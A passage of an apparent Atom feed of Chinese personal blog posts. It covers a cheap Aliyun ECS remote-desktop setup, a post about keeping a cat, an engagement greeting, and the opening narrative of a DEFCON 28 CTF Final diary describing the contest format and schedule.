src="https://img.vvzero.com/blog/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/3ea24c1929367.png" alt="Snipaste_2020-02-09_18-21-04.png"></p><p>我还想更便宜。</p><h3 id="与基友合租一台机器"><a href="#与基友合租一台机器" class="headerlink" title="与基友合租一台机器"></a>与基友合租一台机器</h3><p>我想你一定不可能一天24小时都在用它，用它的时候也一定不会一直占满 CPU。关键是，我们这是 Windows Server，跟家庭版、专业版、企业版什么的都不一样，它支持多个用户同时登陆！所以，我觉得，如果有信任的人选，完全可以合租。</p><h3 id="关机时选择“停机不计费”"><a href="#关机时选择“停机不计费”" class="headerlink" title="关机时选择“停机不计费”"></a>关机时选择“停机不计费”</h3><p>阿里云真的是神奇的存在，在 ECS 管理界面，选择停机，竟然可以停机不收费！</p><p><img src="https://img.vvzero.com/blog/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/28437c5fae934.png" alt="图片1.png"></p><p>实际上也不是完全不收费，硬盘和弹性公网 IP 仍然是收费的。但是，与停机后仍然保留CPU、内存相比，价格大幅降低。也就是说，我们在每天晚上，完全可以关机并选择不收费，可以节约一大笔。如果想要一直使用同一个 IP，可以选择绑定弹性公网 IP。</p><h3 id="依据个人需求选择实例规格"><a href="#依据个人需求选择实例规格" class="headerlink" title="依据个人需求选择实例规格"></a>依据个人需求选择实例规格</h3><p>我觉得，可能 8GB 内存已经够我用了，另外，青岛区的实例好像每小时能更便宜一毛钱……</p><h2 id="云桌面体验"><a href="#云桌面体验" class="headerlink" title="云桌面体验"></a>云桌面体验</h2><p>在体验之前，再确保一下：该实例网络安全组，需要放通 3389 端口（TCP 和 UDP 都要放通）。</p><p>打开本地的远程桌面客户端试试吧！</p><p><img src="https://img.vvzero.com/blog/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/b4629c62b4373.png" alt="Snipaste_2020-02-09_18-38-25.png"></p><p>网络方面，我是江苏电信网络，连接上海区的 ECS，延迟很小，可以忽略，而且画质很清晰，暂时没有什么画面卡顿。至于下行网络，由于这是阿里云的专线，比家用运营商网络好太多，下载速度嗖嗖的，不管国内外。</p><p>计算性能方面，在我本地机器上，VSCode 的 Python 插件，进行一次文件错误扫描需要 5 秒左右，而这台云桌面，只要 1 秒。</p><p>操作系统方面，Windows Server 比 Windows PC 简洁很多，没有乱七八糟的服务，但也没有缺少日常开发所需的重要组件。可能会有点不一样，但是如果出问题，一般能很快解决。比如我在安装 Python 时出错，Google 一下便知要直接以管理员身份打开。</p><p>以下截图自我的云桌面。</p><p><img src="https://img.vvzero.com/blog/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/d3b52ba297968.png" alt="Screenshot _1_.png"></p><p><img src="https://img.vvzero.com/blog/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/e9ae18b879037.png" alt="Screenshot _3_.png"></p><p><img src="https://img.vvzero.com/blog/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/9f2c0741b0057.png" alt="Screenshot _4_.png"></p><p><img src="https://img.vvzero.com/blog/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/8109324fabb58.png" alt="Screenshot _2_.png"></p><h3 id="提高体验的可选项"><a href="#提高体验的可选项" class="headerlink" title="提高体验的可选项"></a>提高体验的可选项</h3><ol><li>关闭 Windows 的过渡动画，这在远程桌面上会导致卡顿，且会消耗大量的流量费；</li><li>安全起见，重新创建一个管理员用户并禁用 Administrator 用户；</li><li>用好各种云同步功能，比如 Git 仓库、浏览器云同步、云盘等。</li></ol><h2 id="实测价格"><a href="#实测价格" class="headerlink" title="实测价格"></a>实测价格</h2><p>我正常使用了一天，晚上停机不收费，消费如下：</p><p><img src="https://img.vvzero.com/blog/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/176c67e7015fa.png" alt="Snipaste_2020-02-09_18-54-30.png"></p><p><img src="https://img.vvzero.com/blog/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/140f26bd1d962.png" alt="Snipaste_2020-02-09_18-55-07.png"></p><p>可见，我一天大致消费5元。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>确实不是很贵，可行性也很高。假如有模型渲染需求，甚至可以绑定个显卡（</p><p>抢占式实例也不是很可怕吧？我的实例目前没被回收。</p><p>另外，有人想跟我合租吗？</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2021/02/12/CTF_2021HappyChineseNewYear/</id>
        <title><![CDATA[2021 牛年大吉！又是一年解谜闯关]]></title>
        <updated>2021-02-16T17:15:58+08:00</updated>
        <link href="https://miaotony.xyz/2021/02/12/CTF_2021HappyChineseNewYear/"/>
        <content type="text/html" src="https://miaotony.xyz/2021/02/12/CTF_2021HappyChineseNewYear/"><![CDATA[<h2 id="牛年快乐"><a href="#牛年快乐" class="headerlink"]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/569</id>
        <title><![CDATA[养了几天猫了]]></title>
        <updated>2021-02-16T11:02:17+08:00</updated>
        <link href="https://www.suruifu.com/posts/569"/>
        <content type="text/html" src="https://www.suruifu.com/posts/569"><![CDATA[<p>养猫果然比人贵。</p>
<p>首先需要时间，为了维持室内的整洁，就需要定时打扫。带来的工作量是比较大的。</p>
<p>然后就是吃东西。既然把猫领了回来，我肯定给予其最好的条件。猫是肉食性动物，猫粮的价格甚至能基本达到我每天吃的东西的价格。</p>
<p>而且猫还缺乏主观能动性，就是说我在照顾她，她却什么也不会做。</p>
<p>其实花钱或者花时间都无所谓，因为毕竟她出现在了我的门前，这是上天的旨意。</p>
<p>问题是我在想猫真的快乐吗？猫生的追求是什么？我们人类，一天不工作，就会觉得痛苦，有点进步就会快乐。我热爱生活本身，我享受这种进步的感觉。那猫呢，她有追求吗？她有快乐与痛苦吗？她的世界观是怎样的呢？</p>
<p>我又不是她，我永远不会知道。但我希望猫在我这里能够实现她的猫生价值。</p>
<p>（手机打字）</p>]]></content>
        <author>
            <name><![CDATA[苏瑞辅的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/567</id>
        <title><![CDATA[祝张同学与冯同学幸福美满，百年好合！]]></title>
        <updated>2021-02-15T09:45:01+08:00</updated>
        <link href="https://www.suruifu.com/posts/567"/>
        <content type="text/html" src="https://www.suruifu.com/posts/567"><![CDATA[<p>惊悉冯同学与张同学昨日订婚<br />
祝幸福美满，百年好合，长长久久！</p>]]></content>
        <author>
            <name><![CDATA[苏瑞辅的个人网站]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/10/15/Defcon28final/</id>
        <title><![CDATA[DEFCON 28 Final 杂记]]></title>
        <updated>2021-02-12T10:29:56+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/10/15/Defcon28final/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/10/15/Defcon28final/"><![CDATA[<html><head></head><body><p>&#x8DDD;&#x79BB; DEFCON 28 Final &#x5DF2;&#x7ECF;&#x8FC7;&#x53BB;&#x4E86;&#x4E24;&#x4E2A;&#x591A;&#x6708;&#x4E86;&#xFF0C;&#x672C;&#x6765;&#x7ED3;&#x675F;&#x5C31;&#x5199;&#x5199;&#xFF0C;&#x4F46;&#x662F;&#x56E0;&#x4E3A;&#x4E00;&#x4E9B;&#x540E;&#x6765;&#x4E8B;&#x803D;&#x6401;&#x4E86;&#xFF0C;&#x73B0;&#x5728;&#x8865;&#x4E00;&#x4E0B;&#x8FD9;&#x6B21;&#x53C2;&#x8D5B;&#x7684;&#x4E00;&#x4E9B;&#x7ECF;&#x5386;&#x3002;</p><a id="more"></a><p>[TOC]</p><h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p><strong>&#x524D;&#x8A00;&#xFF1A;&#x672C;&#x7BC7;&#x6587;&#x7AE0;&#x4E0D;&#x4EE3;&#x8868;&#x4EFB;&#x4F55;&#x7EC4;&#x7EC7;&#x793E;&#x56E2;&#x7684;&#x89C2;&#x70B9;&#xFF0C;&#x5168;&#x6587;&#x4EC5;&#x4EE3;&#x8868;&#x4E2A;&#x4EBA;&#x770B;&#x6CD5;&#x4EE5;&#x53CA;&#x610F;&#x89C1;&#x3002;&#x5982;&#x6709;&#x5192;&#x72AF;&#x8BF7;&#x8054;&#x7CFB;&#x6211;&#x8FDB;&#x884C;&#x5FC5;&#x8981;&#x7684;&#x4FEE;&#x6539;&#x3002;</strong></p><p>&#x7531;&#x4E8E;&#x4ECA;&#x5E74;&#x75AB;&#x60C5;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x4ECA;&#x5E74;&#x7684; DEFCON Final &#x5728;&#x7EBF;&#x4E0A;&#x4E3E;&#x529E;&#xFF0C;&#x6211;&#x6709;&#x5E78;&#x4E0E; Tea Deliverers &#x4E00;&#x8D77;&#x53C2;&#x4E0E;&#x4E86; DEFCON 28 CTF Final &#xFF0C;&#x6700;&#x7EC8;&#x5728;&#x6BD4;&#x8D5B;&#x4E2D;&#x53D6;&#x5F97;&#x4E86;&#x7B2C;&#x56DB;&#x7684;&#x6210;&#x7EE9;&#x3002;&#x672C;&#x6587;&#x6211;&#x4F1A;&#x4E3B;&#x8981;&#x4ECE;&#x53C2;&#x8D5B;&#x7ECF;&#x5386;&#x89C1;&#x95FB;&#x4EE5;&#x53CA;&#x4E00;&#x4E9B;&#x5BF9;&#x4E8E; Web &#x9898;&#x7684;&#x5206;&#x6790;&#x5165;&#x624B;&#x6765;&#x5199;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#xFF0C;&#x7531;&#x4E8E; Web &#x9898;&#x8FC7;&#x5206;&#x7B80;&#x5355;&#xFF0C;&#x4E5F;&#x6CA1;&#x4EC0;&#x4E48;&#x7279;&#x522B;&#x597D;&#x5206;&#x6790;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x6CA1;&#x4EC0;&#x4E48;&#x6280;&#x672F;&#x8425;&#x517B;&#xFF0C;&#x53EF;&#x4EE5;&#x6743;&#x5F53;&#x5C0F;&#x8BF4;&#x770B;&#x770B;&#xFF0C;&#x535A;&#x541B;&#x4E00;&#x7B11;&#x3002;&#x5E76;&#x4E14;&#x4E3A;&#x4E86;&#x907F;&#x514D;&#x4E00;&#x4E9B;&#x4E0D;&#x5FC5;&#x8981;&#x7684;&#x9EBB;&#x70E6;&#xFF0C;&#x5168;&#x6587;&#x6D89;&#x53CA;&#x5230;&#x59D3;&#x540D; ID &#x5904;&#x6211;&#x90FD;&#x5C3D;&#x91CF;&#x4EE5;&#x67D0;&#x5E08;&#x5085;&#x8FDB;&#x884C;&#x79F0;&#x547C;&#x3002;</p><h1 id="The-First-DEFCON-Final-In-My-Life"><a href="#The-First-DEFCON-Final-In-My-Life" class="headerlink" title="The First DEFCON Final In My Life"></a>The First DEFCON Final In My Life</h1><h2 id="Simple-Introduction"><a href="#Simple-Introduction" class="headerlink" title="Simple Introduction"></a>Simple Introduction</h2><p>&#x4ECA;&#x5E74;&#x7684;&#x8D5B;&#x5236;&#x6211;&#x8FD9;&#x91CC;&#x7B80;&#x5355;&#x4ECB;&#x7ECD;&#x4E00;&#x4E0B;&#xFF0C;&#x60F3;&#x8BE6;&#x7EC6;&#x4E86;&#x89E3;&#x7684;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x4E00;&#x4E0B;&#x5B98;&#x7F51;:<a href="https://oooverflow.io/dc-ctf-2020-finals/" target="_blank" rel="noopener">https://oooverflow.io/dc-ctf-2020-finals/</a></p><p>&#x9898;&#x76EE;&#x4E3B;&#x8981;&#x5206;&#x4E3A;&#x4E24;&#x79CD;&#x7C7B;&#x578B;&#xFF0C;&#x4E00;&#x79CD;&#x7C7B;&#x578B;&#x662F; AWD &#xFF0C;&#x53E6;&#x4E00;&#x79CD;&#x662F; KOH &#xFF0C;AWD &#x5C31;&#x6BD4;&#x8F83;&#x5E38;&#x89C1;&#x4E86;&#xFF0C;&#x5C31;&#x662F;&#x653B;&#x9632;&#x9898;&#x76EE;&#xFF0C;&#x8FD9;&#x6B21;&#x4E5F;&#x662F;&#x6211;&#x7B2C;&#x4E00;&#x6B21;&#x63A5;&#x89E6; KOH &#x8FD9;&#x79CD;&#x9898;&#x76EE;&#x7C7B;&#x578B;&#xFF0C;&#x8FD9;&#x79CD;&#x9898;&#x76EE;&#x7C7B;&#x578B;&#x5F80;&#x5F80;&#x662F;&#x9898;&#x76EE;&#x4E2D;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x4E00;&#x4E2A;&#x79EF;&#x5206;&#x89C4;&#x5219;&#xFF0C;&#x7136;&#x540E;&#x8BA9;&#x5404;&#x4E2A;&#x961F;&#x4F0D;&#x5728;&#x6BCF;&#x4E2A; ROUND &#x5C3D;&#x53EF;&#x80FD;&#x62FF;&#x5230;&#x66F4;&#x591A;&#x7684;&#x5206;&#x6570;&#xFF0C;&#x6BCF;&#x4E2A; ROUND &#x53D6;&#x524D; N &#x540D;&#xFF0C;&#x6BCF;&#x4E2A; ROUND &#x7ED3;&#x675F;&#x7EDF;&#x8BA1;&#x5206;&#x6570;&#x5E76;&#x7ED9;&#x524D; N &#x540D;&#x7684;&#x961F;&#x4F0D;&#x5728;&#x603B;&#x699C;&#x7684; KOH &#x5217;&#x52A0;&#x5206;&#x3002;&#x5728; KOH &#x4E2D;&#x5982;&#x4F55;&#x62FF;&#x66F4;&#x591A;&#x7684;&#x5206;&#x6570;&#x5C31;&#x662F;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x7684;&#x51FA;&#x9898;&#x70B9;&#x4E86;&#xFF0C;&#x8FD9;&#x4E9B;&#x51FA;&#x9898;&#x70B9;&#x53EF;&#x4EE5;&#x6709;&#x4E00;&#x4E9B;&#x8BBE;&#x7F6E;&#x7684;&#x6F0F;&#x6D1E;&#x6216;&#x8005;&#x4EC0;&#x4E48;&#x5176;&#x4ED6;&#x7684;&#x65B9;&#x5F0F;&#x8BA9;&#x4F60;&#x53EF;&#x4EE5;&#x5728;&#x4E00;&#x4E2A; ROUND &#x5398;&#x9762;&#x5F97;&#x66F4;&#x591A;&#x7684;&#x5206;&#x6570;&#xFF0C;&#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x7406;&#x89E3; KOH &#x7ED9;&#x4E86;&#x4F60;&#x4E00;&#x4E2A;&#x6E38;&#x620F;&#xFF0C;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x6BCF;5&#x5206;&#x949F;&#x73A9;&#x4E00;&#x628A;&#x6E38;&#x620F;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5BF9;&#x6E38;&#x620F;&#x5206;&#x6790;&#x6765;&#x627E;&#x5230;&#x4E00;&#x4E9B; bug &#x6216;&#x8005;&#x4EC0;&#x4E48;&#x5176;&#x4ED6;&#x7684;&#x70B9;&#xFF0C;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x70B9;&#x6765;&#x5E2E;&#x52A9;&#x4F60;&#x50CF;&#x201C;&#x5F00;&#x6302;&#x201D;&#x4E00;&#x6837;&#x5F97;&#x5206;&#x3002;</p><h2 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h2><blockquote><p>&#x200B;    We&#x2019;ll start <a href="https://www.timeanddate.com/worldclock/fixedtime.html?msg=Start+of+DEF+CON+CTF+finals&amp;iso=20200807T05&amp;p1=127" target="_blank" rel="noopener">5 AM Las Vegas time on Friday, August 7th</a> (4 AM for setup).</p><p>Here is the schedule (Nevada time == PDT):</p><ul><li>Shift 1: Friday 4am setup, 5am start, 1pm end</li><li><strong>First public recap: <a href="https://www.timeanddate.com/worldclock/fixedtime.html?msg=CTF+recap+stream&amp;iso=20200807T14&amp;p1=127" target="_blank" rel="noopener">Friday 2 PM</a></strong></li><li>Shift 2: Friday 9pm setup, 10pm start, Saturday 6am end</li><li><strong>Second public recap: <a href="https://www.timeanddate.com/worldclock/fixedtime.html?msg=CTF+recap+stream&amp;iso=20200808T13&amp;p1=127" target="_blank" rel="noopener">Saturday 1 PM</a></strong></li><li>Shift 3: Saturday 2pm setup, 3pm start, 11pm end</li><li>Shift 4: Sunday 7am setup, 8am start, 4pm end</li><li><strong>Third public recap: <a href="https://www.timeanddate.com/worldclock/fixedtime.html?msg=CTF+recap+stream&amp;iso=20200809T12&amp;p1=127" target="_blank" rel="noopener">Sunday at noon</a> (during the game)</strong></li></ul></blockquote><p>&#x8FD9;&#x8F6E;&#x7684;&#x65F6;&#x95F4;&#x53EF;&#x8C13;&#x662F;&#x76F8;&#x5F53;&#x7684;&#x6240;&#x8C13;&#x7684;&#x201C;&#x5065;&#x5EB7;&#x201D;&#x4E86;&#xFF0C;&#x4E0A;&#x8FF0;&#x65F6;&#x95F4;&#x8868;&#x7FFB;&#x8BD1;&#x5230;&#x5317;&#x4EAC;&#x65F6;&#x95F4;&#x8FC7;&#x6765;&#x5C31;&#x662F;&#xFF1A;</p><blockquote><ul><li>Shift 1: Friday 7pm setup, 8pm start, Saturday 4am end</li><li>Shift 2: Saturday 12am setup, 1pm start,  9pm end</li><li>Shift 3: Sunday 5am setup, 6am start, 2pm end</li><li>Shift 4: Sunday 10pm setup, 11pm start, Monday 7am end</li></ul></blockquote><p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x6BCF;&#x4E2A; Shift &#x6BD4;&#x8D5B;&#x8FDB;&#x884C;8&#x5C0F;&#x65F6;&#xFF0C;&#x6BCF;&#x4E2A; Shift &#x4E2D;&#x95F4;&#x95F4;&#x9694;8&#x5C0F;&#x65F6;&#xFF0C;&#x800C;&#x4E14;&#x662F;&#x6B63;&#x6B63;&#x597D;&#x597D;&#x7684;8&#x5C0F;&#x65F6; =.= &#x8FD9;&#x5C31;&#x662F;&#x6240;&#x8C13;&#x7684;&#x201C;&#x5065;&#x5EB7;&#x201D;&#x8D5B;&#x5236;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4ECE;&#x6BD4;&#x8D5B;&#x573A;&#x5730;&#x56DE;&#x5BB6;&#x4F11;&#x606F;&#x518D;&#x641E;&#x4F1A;&#x600E;&#x4E48;&#x90FD;&#x6CA1;&#x5269;&#x591A;&#x5C11;&#x65F6;&#x95F4;&#x4E86;&#xFF0C;&#x6211;&#x89C9;&#x5F97;&#x8FD8;&#x4E0D;&#x5982;&#x786C;&#x809D;&#x597D;&#x4E86;&#xFF08;&#x53CD;&#x6B63;&#x6211;&#x89C9;&#x5F97;&#x6CA1;&#x51E0;&#x4E2A;&#x961F;&#x50CF;&#x6211;&#x8FD9;&#x4E2A;&#x6DF7;&#x5B50;&#x4E00;&#x6837;8&#x5C0F;&#x65F6;&#x5168;&#x7761;&#xFF09;&#xFF0C;&#x800C;&#x4E14;&#x8FD8;&#x5206;&#x4E86;4&#x8F6E;&#xFF0C;&#x8FD9;&#x662F;&#x771F;&#x7684;&#x809D;&#xFF0C;&#x4E8E;&#x662F;&#x90A3;&#x51E0;&#x5929;&#x6211;&#x7684;&#x4E16;&#x754C;&#x5C31;&#x53D8;&#x6210;&#x4E86;&#x4E00;&#x5929;16&#x5C0F;&#x65F6;&#x7684;&#x4E16;&#x754C;&#xFF0C;8&#x5C0F;&#x65F6;&#x770B;&#x9898;&#x5F53;&#x6DF7;&#x5B50;&#xFF0C;8&#x5C0F;&#x65F6;&#x7761;&#x89C9;&#x3002;&#xFF08;</p><h2 id="Stealth-Ports"><a href="#Stealth-Ports" class="headerlink" title="Stealth Ports"></a>Stealth Ports</h2><p>&#x5728; AWD &#x8D5B;&#x5236;&#x4E2D;&#xFF0C; OOO &#x52A0;&#x5165;&#x4E86; Stealth Ports &#x8FD9;&#x79CD;&#x673A;&#x5236;&#xFF1A;</p><blockquote><p>&#x200B;    New this year, each service will have a STEALTH port alongside it&#x2019;s normal port. The stealth port will be 10000+SERVICE_PORT, so If a challenge listens on port 1337, the stealth port will be 11337. The stealth port hits the same exact challenge endpoint as the normal port, but traffic through that port will not be released to the victim team. But beware: maintaining backdoor access to other teams ain&#x2019;t cheap! If your team sends any traffic through a service&#x2019;s stealth port to a given team, you will only receive half points for stealing that team&#x2019;s flag that round.</p></blockquote><p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x4E3B;&#x529E;&#x65B9;&#x7ED9;&#x5927;&#x5BB6;&#x5F00;&#x653E;&#x4E86;&#x4E00;&#x4E2A;&#x4E0D;&#x7ED9;&#x6D41;&#x91CF;&#x7684;&#x7AEF;&#x53E3;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x653B;&#x51FB;&#x65B9;&#x6210;&#x529F;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x7AEF;&#x53E3;&#x83B7;&#x53D6;&#x5230;&#x9632;&#x5B88;&#x65B9;&#x7684; Flag &#xFF0C;&#x5219; Flag &#x5206;&#x4F1A;&#x51CF;&#x534A;&#x3002;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x8FD9;&#x76F8;&#x5F53;&#x4E8E;&#x4E00;&#x4E2A;&#x9690;&#x5F62;&#x7684;&#x7AEF;&#x53E3;&#xFF0C;&#x5BF9;&#x4E8E;&#x4E00;&#x8840;&#x7684;&#x961F;&#x4F0D;&#x6BD4;&#x8F83;&#x6709;&#x5229;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x7AEF;&#x53E3;&#x8FC5;&#x901F;&#x6253;&#x5168;&#x573A;&#x800C;&#x4E0D;&#x88AB;&#x6355;&#x83B7;&#x5230;&#x6D41;&#x91CF;&#xFF0C;&#x4F46;&#x662F;&#x5F97;&#x5206;&#x4F1A;&#x51CF;&#x534A;&#xFF0C;&#x4E5F;&#x7B97;&#x662F;&#x4E00;&#x79CD;&#x53CC;&#x5203;&#x5251;&#x3002;</p><h2 id="Before-Shift-1"><a href="#Before-Shift-1" class="headerlink" title="Before Shift 1"></a>Before Shift 1</h2><p>&#x5F00;&#x59CB;&#x4E4B;&#x524D;&#x6211;&#x4E5F;&#x5E76;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x7279;&#x522B;&#x7684;&#x51C6;&#x5907;&#xFF0C;&#x7ECF;&#x8FC7;&#x4E00;&#x756A;&#x8BA8;&#x8BBA;&#x51B3;&#x5B9A;&#x6211;&#x4EEC;&#x8FD8;&#x662F;&#x5728;&#x67D0;&#x5E08;&#x5085;&#x7684;&#x516C;&#x53F8;&#x91CC;&#x6253;&#x6BD4;&#x8D5B;&#xFF0C;&#x8FD9;&#x4E9B;&#x8BA8;&#x8BBA;&#x5305;&#x62EC;&#x4F46;&#x4E0D;&#x9650;&#x4E8E;&#x6BD4;&#x8D5B;&#x573A;&#x5730;&#x8981;&#x4E0D;&#x8981;&#x9009;&#x4E00;&#x4E2A;&#x522B;&#x5885;&#x5565;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x8003;&#x8651;&#x5230;&#x7F51;&#x7EDC;&#x95EE;&#x9898;&#x8FD8;&#x662F;&#x51B3;&#x5B9A;&#x4E86;&#x5728;&#x516C;&#x53F8;&#x91CC;&#xFF0C;&#x4EE5;&#x53CA;&#x5927;&#x5BB6;&#x8981;&#x4E0D;&#x8981;&#x4E00;&#x8D77;&#x5148;&#x5403;&#x4E2A;&#x996D;&#x505A;&#x4E2A;&#x8D5B;&#x524D;&#x52A8;&#x5458;&#x4EC0;&#x4E48;&#x7684;&#x3002;&#x6240;&#x4EE5;&#x5C31;&#x5728;&#x5F00;&#x8D5B;&#x524D;2&#x5C0F;&#x65F6;&#x591A;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x4E0B;&#x5348;5&#x70B9;&#x591A;&#xFF0C;&#x6211;&#x968F;&#x6211; Mentor &#x5C31;&#x4E00;&#x8D77;&#x53BB;&#x8DDF;&#x961F;&#x5458;&#x4EEC;&#x5403;&#x4E86;&#x4E2A;&#x996D;&#xFF0C;&#x4E5F;&#x7B97;&#x662F;&#x8DDF;&#x5927;&#x5BB6;&#x8BA4;&#x8BC6;&#x8BA4;&#x8BC6;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x88AB;&#x6392;&#x5728;&#x4E86; Leader &#x65C1;&#x8FB9;&#x5750;&#xFF08;&#x7D27;&#x5F20;&#x6B7B;&#x4E86;&#xFF0C;&#x6709;&#x79CD;&#x9886;&#x5BFC;&#x5939;&#x83DC;&#x6211;&#x8F6C;&#x684C;&#x7684;&#x51B2;&#x52A8;&#xFF09;&#xFF0C;&#x7136;&#x540E; Leader &#x65C1;&#x8FB9;&#x53C8;&#x662F;&#x90A3;&#x4E2A;&#x7EDF;&#x6CBB;&#x5F3A;&#x7F51;&#x676F;&#x7684;&#x201C;&#x90A3;&#x4E2A;&#x7537;&#x4EBA;&#x201D;&#xFF08;&#x53C8;&#x7D27;&#x5F20;&#x6B7B;&#x4E86;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x8DDF;&#x8FD9;&#x79CD;&#x53EF;&#x6015;&#x7684;&#x5DE8;&#x578B;&#x5927;&#x4F6C;&#x751F;&#x7269;&#x8FDB;&#x884C;&#x4EA4;&#x6D41;&#xFF09;&#xFF0C;&#x6574;&#x4E2A;&#x4F1A;&#x9910;&#x5C31;&#x8FD9;&#x6837;&#x5728;&#x5BF9;&#x4E8E;&#x6211;&#x6765;&#x8BF4;&#x5728;&#x4E00;&#x79CD;&#x4E0D;&#x53EF;&#x540D;&#x72B6;&#x7684;&#x6C1B;&#x56F4;&#x4E0B;&#x7ED3;&#x675F;&#x4E86;&#x3002;XD&#xFF08;&#x611F;&#x89C9;&#x5176;&#x4ED6;&#x4EBA;&#x771F;&#x7684;&#x662F;&#x53C8;&#x5F3A;&#x53C8;&#x58EE;&#xFF0C;<small>&#x5C31;&#x6211;&#x4E00;&#x4E2A;&#x53EF;&#x601C;&#x5F31;&#x5C0F;&#x7684;&#x5C0F;&#x83DC;&#x9E21;</small></p><h2 id="Shift-1"><a href="#Shift-1" class="headerlink" title="Shift 1"></a>Shift 1</h2><p>&#x7531;&#x4E8E;&#x4E4B;&#x524D;&#x63A5;&#x5165;&#x7B49;&#x7B49;&#x51C6;&#x5907;&#x5DE5;&#x4F5C;&#x5E08;&#x5085;&#x4EEC;&#x90FD;&#x505A;&#x5B8C;&#x4E86;&#xFF0C;&#x6211;&#x4FBF;&#x5728; setup &#x5C31;&#x5F00;&#x6DF7;&#x4E86;&#xFF0C;&#x4E8E;&#x662F;&#x5C31;&#x5C2C;&#x7B49;&#x6BD4;&#x8D5B;&#x5F00;&#x59CB;&#x3002;&#x7B2C;&#x4E00;&#x5929;&#x653E;&#x4E86;&#x8C8C;&#x4F3C;&#x4E24;&#x4E2A;&#x4E8C;&#x8FDB;&#x5236;&#x7684; AWD &#xFF0C;&#x8FD8;&#x6709;&#x4E00;&#x4E2A; KOH &#xFF0C;KOH &#x7ED9;&#x7684;&#x662F;&#x4E00;&#x4E2A; 21 &#x70B9;&#x7684;&#x6E38;&#x620F;&#xFF0C;&#x8DDF;&#x666E;&#x901A;&#x7684; 21 &#x70B9;&#x6E38;&#x620F;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x6709;&#x4E00;&#x4E2A;&#x5E84;&#x5BB6;&#xFF0C;&#x6240;&#x6709;&#x961F;&#x4F0D;&#x90FD;&#x8FDB;&#x884C;&#x4E0B;&#x6CE8;&#xFF0C;&#x8981;&#x724C;&#x8D85;&#x8FC7; 21 &#x70B9;&#x7684;&#x961F;&#x4F0D;&#x5C31;&#x5728;&#x5F53;&#x524D; ROUND &#x76F4;&#x63A5;&#x51FA;&#x5C40;&#xFF0C;&#x5269;&#x4E0B;&#x7684;&#x961F;&#x4F0D;&#x7EE7;&#x7EED;&#x8FDB;&#x884C;&#x6E38;&#x620F;&#xFF0C;&#x901A;&#x8FC7;&#x8FD9;&#x6837;&#x7684;&#x65B9;&#x5F0F;&#x51B3;&#x51FA;&#x6E38;&#x620F;&#x79EF;&#x5206;&#x524D;&#x4E94;&#x540D;&#xFF0C;&#x5728;&#x5BF9;&#x5E94;&#x961F;&#x4F0D;&#x7684; KOH &#x5206;&#x6570;&#x4E0A;&#x8FDB;&#x884C;&#x52A0;&#x5206;&#x3002;</p><p>&#x4E00;&#x5F00;&#x59CB;&#x6CA1;&#x4EC0;&#x4E48;&#x961F;&#x4F0D;&#x5F97;&#x5206;&#xFF0C;&#x7531;&#x4E8E;&#x7ED9;&#x51FA;&#x7684;&#x662F; Web &#x5730;&#x5740;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x4E00;&#x5F00;&#x59CB;&#x5C31;&#x5F53;&#x4F5C; Web &#x9898;&#x6765;&#x505A;&#x4E86;&#xFF0C;&#x5404;&#x79CD;&#x6D4B;&#x4E86;&#x6D4B;&#xFF0C;&#x7136;&#x540E;&#x53D1;&#x73B0;&#x867D;&#x7136;&#x8FD9;&#x4E2A; Web &#x5E73;&#x53F0;&#x662F; Flask &#x5E76;&#x4E14;&#x5F00;&#x4E86; Debug &#xFF0C;&#x4E00;&#x4E2A;&#x4E0A;&#x4F20;&#x9519;&#x8BEF;&#x76F4;&#x63A5;&#x8DF3;&#x5230;&#x4E86; Debug &#x9519;&#x8BEF;&#x754C;&#x9762;&#xFF0C;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x6CA1;&#x6709;&#x627E;&#x5230;&#x5176;&#x4ED6;&#x5730;&#x65B9;&#x6709;&#x6D1E;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x6765;&#x83B7;&#x53D6; PIN 